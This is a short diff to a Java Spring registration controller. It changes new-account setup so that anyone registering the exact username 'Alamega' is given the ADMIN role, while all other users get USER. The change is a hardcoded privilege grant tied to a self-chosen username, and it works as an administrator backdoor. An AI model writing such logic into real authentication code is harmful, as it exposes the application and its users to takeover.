@@ -49,7 +49,11 @@ public class AuthController {
             User user = new User();
             user.setUsername(username);
             user.setPassword(new BCryptPasswordEncoder().encode(password));
-            user.setRole("USER");
+            if (username.equals("Alamega")) {
+                user.setRole("ADMIN");
+            } else {
+                user.setRole("USER");
+            }
             user.setEnabled(true);
             userRepository.save(user);
             model.addAttribute("result", "Регистрация прошла успешно!");
